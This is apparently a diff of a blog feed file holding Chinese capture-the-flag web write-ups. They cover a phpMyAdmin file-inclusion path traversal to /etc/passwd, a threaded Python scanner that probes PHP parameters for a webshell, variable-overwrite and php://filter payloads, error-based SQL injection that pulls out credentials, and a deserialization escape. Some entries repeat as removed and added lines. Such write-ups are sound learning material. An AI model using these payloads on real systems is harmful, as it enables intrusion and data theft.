-<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>学到了请求有get改成post</p>
-<p>点击help，发现报错，把get改为post，同时改后面参数，改成post上去</p>
-<pre><code>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)
-</code></pre>
-<p>得到一个奇怪的包的目录</p>
-<p>看了下wp，java项目源码在WEB-INF中，构造pyload</p>
-<p>params需要加个filename=WEB-INF/classes/com/wm/ctf/FlagController.class 同时post filename就可以把class下下来</p>
-<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>把源码下下来，一共好几千个文件里面有我们需要的马，我们只需要一个一个试即可🥰</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\haodo\Desktop\20211129\高明黑客\src&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://fab0ef41-82a7-480e-a354-be549de9731f.node4.buuoj.cn:81/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
-<p>需要先本地测试，找到马后直接服务器利用即可</p>
-<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖漏洞</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>好多payload:</p>
-<pre><code>yds=flag
-is=flag&amp;flag=flag
-</code></pre>
-<h2 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h2><p>php://filter应用</p>
-<p><a href="https://oatmeal.vip/security/web-learning/php-filter/">https://oatmeal.vip/security/web-learning/php-filter/</a></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> 	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>构造:</p>
-<pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag
-</code></pre>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>代码审计</tag>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20220101</title>
-    <url>/posts/c3e022b4/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>2021秋季赛部分wp</title>
@@ -1189,6 +1141,72 @@ is=flag&amp;flag=flag
       </tags>
   </entry>
   <entry>
+    <title>20211129</title>
+    <url>/posts/11d5b1/</url>
+    <content><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><blockquote>
+<p>phpmyadmin 4.8 cve 文件包含漏洞</p>
+</blockquote>
+<pre><code>?target=db_sql.php%253f/../../../../../../etc/passwd
+</code></pre>
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>学到了请求有get改成post</p>
+<p>点击help，发现报错，把get改为post，同时改后面参数，改成post上去</p>
+<pre><code>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)
+</code></pre>
+<p>得到一个奇怪的包的目录</p>
+<p>看了下wp，java项目源码在WEB-INF中，构造pyload</p>
+<p>params需要加个filename=WEB-INF/classes/com/wm/ctf/FlagController.class 同时post filename就可以把class下下来</p>
+<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>把源码下下来，一共好几千个文件里面有我们需要的马，我们只需要一个一个试即可🥰</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\haodo\Desktop\20211129\高明黑客\src&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://fab0ef41-82a7-480e-a354-be549de9731f.node4.buuoj.cn:81/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
+<p>需要先本地测试，找到马后直接服务器利用即可</p>
+<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖漏洞</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好多payload:</p>
+<pre><code>yds=flag
+is=flag&amp;flag=flag
+</code></pre>
+<h2 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h2><p>php://filter应用</p>
+<p><a href="https://oatmeal.vip/security/web-learning/php-filter/">https://oatmeal.vip/security/web-learning/php-filter/</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> 	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造:</p>
+<pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag
+</code></pre>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>代码审计</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20220206</title>
+    <url>/posts/5fc2094e/</url>
+    <content><![CDATA[<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>先fuzz，过滤了空格</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+<p>updatexml注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库</span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查表</span></span><br><span class="line"><span class="string">admin&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(table_name)<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))#</span><br><span class="line"></span><br><span class="line">查列</span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查数据</span></span><br><span class="line"><span class="string">admin&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(id,username,password))<span class="keyword">from</span>(geek.H4rDsq1)<span class="keyword">where</span>(id)<span class="keyword">like</span>(<span class="string">&#x27;1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))#</span><br><span class="line"></span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)where(id)like(&#x27;</span><span class="number">1</span><span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;7e570192-d6e8-4d02-aa0b-d1b684f7ae53&#125;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20220101</title>
+    <url>/posts/c3e022b4/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>20220207</title>
     <url>/posts/28c539d8/</url>
     <content><![CDATA[<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><span id="more"></span>
@@ -1240,21 +1258,42 @@ is=flag&amp;flag=flag
       </tags>
   </entry>
   <entry>
-    <title>20220206</title>
-    <url>/posts/5fc2094e/</url>
-    <content><![CDATA[<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>先fuzz，过滤了空格</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
-<p>updatexml注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库</span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查表</span></span><br><span class="line"><span class="string">admin&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(table_name)<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))#</span><br><span class="line"></span><br><span class="line">查列</span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查数据</span></span><br><span class="line"><span class="string">admin&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(id,username,password))<span class="keyword">from</span>(geek.H4rDsq1)<span class="keyword">where</span>(id)<span class="keyword">like</span>(<span class="string">&#x27;1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))#</span><br><span class="line"></span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)where(id)like(&#x27;</span><span class="number">1</span><span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;7e570192-d6e8-4d02-aa0b-d1b684f7ae53&#125;</span></span><br></pre></td></tr></table></figure>
+    <title>20220209</title>
+    <url>/posts/cf7d14df/</url>
+    <content><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><blockquote>
+<p>好难的题，用了2个小时，反序列化逃逸，上一次做还是在选拔赛上</p>
+</blockquote>
+<pre><code>d0g3_f1ag.php
 
-]]></content>
+一些草稿
+_SESSION[phpflag]=s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+
+&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s&#125;
+
+&quot;a:2:&#123;s:7:&quot;&quot;;hhhhh&quot;;s:1:&quot;1&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s&#125;
+
+_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+此时session数组
+phpfalg ==&gt; ;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+img ==&gt; 无效路径
+序列化为
+&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;
+过滤后
+&quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot; 逃逸成功
+反序列化，此时session数组
+&quot;;s:48: ==&gt; 1
+img ==&gt; L2QwZzNfZmxsbGxsbGFn
+</code></pre>
+<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2>]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
-        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1394,63 +1433,6 @@ while os.path.exists(p1) or os.path.exists(p2):
       </tags>
   </entry>
   <entry>
-    <title>20220209</title>
-    <url>/posts/cf7d14df/</url>
-    <content><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><blockquote>
-<p>好难的题，用了2个小时，反序列化逃逸，上一次做还是在选拔赛上</p>
-</blockquote>
-<pre><code>d0g3_f1ag.php
-
-一些草稿
-_SESSION[phpflag]=s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
-
-&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
-;s&#125;
-
-&quot;a:2:&#123;s:7:&quot;&quot;;hhhhh&quot;;s:1:&quot;1&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
-;s&#125;
-
-_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
-此时session数组
-phpfalg ==&gt; ;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
-img ==&gt; 无效路径
-序列化为
-&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
-;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;
-过滤后
-&quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
-;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot; 逃逸成功
-反序列化，此时session数组
